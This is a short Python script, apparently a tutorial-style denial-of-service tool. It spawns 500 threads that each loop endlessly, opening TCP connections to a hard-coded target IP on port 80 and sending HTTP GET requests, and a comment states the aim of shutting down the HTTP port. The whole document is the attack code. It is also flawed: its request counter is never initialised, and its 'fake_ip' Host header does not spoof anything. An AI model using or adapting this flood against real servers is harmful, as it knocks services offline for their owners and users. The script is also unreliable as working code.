import socket # USED TO CREATE CLIENT-SEVRER APPS
import threading

# setting target ip
target = '192.168.0.19'
fake_ip = '182.15.20.8'
port = 80 # shut down http port

def attack():
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#   AF_INET is the Internet address family for IPv4. SOCK_STREAM is the socket type for TCP, the protocol that will be used to transport messages in the network.
    s.connect((target, port)) # uses .connect() to connect to the server (victim)
    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    global attack_num
    attack_num += 1
    print(attack_num)
    s.close()
# By using multi-threading, we can send many requests at once
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
